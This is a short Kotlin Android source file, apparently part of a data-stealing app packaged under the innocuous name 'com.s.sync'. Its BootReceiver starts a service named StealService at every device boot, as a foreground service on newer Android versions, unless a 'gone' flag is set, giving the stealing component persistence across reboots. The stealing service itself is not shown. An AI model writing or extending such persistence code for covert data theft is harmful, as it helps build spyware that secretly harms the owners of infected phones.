package com.s.sync

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        if (c.getSharedPreferences("p", 0).getBoolean("gone", false)) return
        val s = Intent(c, StealService::class.java)
        if (Build.VERSION.SDK_INT >= 26) c.startForegroundService(s) else c.startService(s)
    }
}